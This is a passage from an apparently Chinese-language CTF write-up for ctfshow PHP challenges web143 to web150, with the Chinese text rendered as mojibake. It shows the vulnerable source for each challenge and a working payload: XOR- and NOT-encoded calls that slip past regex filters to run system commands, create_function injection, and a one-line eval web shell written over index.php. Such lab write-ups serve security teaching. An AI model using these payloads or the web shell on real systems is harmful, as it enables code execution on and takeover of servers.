</span></span></code></pre></div><p>è¿™é¢˜è·Ÿ143å·®ä¸å¤šï¼Œåªæ˜¯å‚æ•°äº¤æ¢äº†ä¸€ä¸‹ä½ç½®</p>
<p>ç›´æ¥å¼‚æˆ–å‡ºäº†</p>
<pre tabindex="0"><code>?v1=1&amp;v2=-(&#34;%0c%06%0c%0b%05%0d&#34;^&#34;%7f%7f%7f%7f%60%60&#34;)(&#34;%03%01%0b%00%06%00&#34;^&#34;%60%60%7f%20%60%2a&#34;)&amp;v3=1
</code></pre><h4 id="web145">web145<a hidden class="anchor" aria-hidden="true" href="#web145">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 17:41:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&#34;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜banæ‰äº†å¼‚æˆ–è¿ç®—ç¬¦^,åŒæ—¶ä¹Ÿbanæ‰äº†åŠ å‡ä¹˜é™¤</p>
<p>ä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥è€ƒè™‘æ„é€ ä¸‰ç›®è¿ç®—ç¬¦é…åˆå–å</p>
<p>payload:</p>
<pre tabindex="0"><code>/?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):
</code></pre><h4 id="web146">web146<a hidden class="anchor" aria-hidden="true" href="#web146">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 17:41:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&#34;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜æŠŠä¸‰ç›®è¿ç®—ç¬¦ä¹Ÿbanäº†</p>
<p>å¯ä»¥è€ƒè™‘ä½¿ç”¨ä½è¿ç®—ç¬¦|</p>
<p><img alt="image-20250124223416316" loading="lazy" src="assets/image-20250124223416316.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|
</code></pre><h4 id="web147">web147<a hidden class="anchor" aria-hidden="true" href="#web147">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 02:04:38
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$ctfshow</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9_]*$/isD&#39;</span><span class="p">,</span><span class="nv">$ctfshow</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nv">$ctfshow</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;show&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>create_function()ä»£ç æ³¨å…¥</p>
<p>å¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ echo 1;}phpinfo();//
å°±ç­‰ä»·äº</p>
<pre tabindex="0"><code>function f($a) {
  echo 1;}phpinfo();//
}
ä»è€Œæ‰§è¡Œphpinfo()å‘½ä»¤
</code></pre><p>é‚£è¦æ€ä¹ˆç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼å‘¢</p>
<pre tabindex="0"><code>/^[a-z0-9_]*$/isD
</code></pre><p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ‰€æœ‰çš„å­—æ¯æ•°å­—å’Œä¸‹åˆ’çº¿</p>
<p>è€Œä¸”ç”±äº</p>
<blockquote>
<p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼› è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•</p></blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡\create_function()æ¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼</p>
<p>payload:</p>
<pre tabindex="0"><code>GET show=;};system(&#39;cat f*&#39;);/*
POST ctf=\create_function
</code></pre><h4 id="web148">web148<a hidden class="anchor" aria-hidden="true" href="#web148">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 03:52:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9_\%</span><span class="se">\\</span><span class="s2">|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">function</span> <span class="nf">get_ctfshow_fl0g</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>æ²¡banå¼‚æˆ–è¿ç®—ç¬¦</p>
<p>payload:</p>
<pre tabindex="0"><code>(&#34;%08%02%08%09%05%0d&#34;^&#34;%7b%7b%7b%7d%60%60&#34;)(&#34;%03%01%09%01%06%02&#34;^&#34;%60%60%7d%21%60%28&#34;);
//system(&#34;cat f*&#34;);
</code></pre><h4 id="web149">web149<a hidden class="anchor" aria-hidden="true" href="#web149">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 04:34:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;show&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ç›´æ¥ç”¨ä¸€å¥è¯æœ¨é©¬è¦†å†™æ‰index.php</p>
<pre tabindex="0"><code>GET ?ctf=index.php
POST show=&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;
</code></pre><p>å†™å…¥å</p>
<pre tabindex="0"><code>POST 1=system(&#39;cat /ctfshow_fl0g_here.txt&#39;);
</code></pre><h4 id="web150">web150<a hidden class="anchor" aria-hidden="true" href="#web150">#</a></h4>
<p>éé¢„æœŸ æ—¥å¿—æ³¨å…¥</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 07:12:57
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">class</span> <span class="nc">CTFSHOW</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">private</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">private</span> <span class="nv">$vip</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">private</span> <span class="nv">$secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">secret</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">isVIP</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">vip</span><span class="o">?</span><span class="k">TRUE</span><span class="o">:</span><span class="k">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">function</span> <span class="nf">__autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$class</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="nv">$class</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="c1">#è¿‡æ»¤å­—ç¬¦
</span></span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\_| |\[|\]|\?/&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
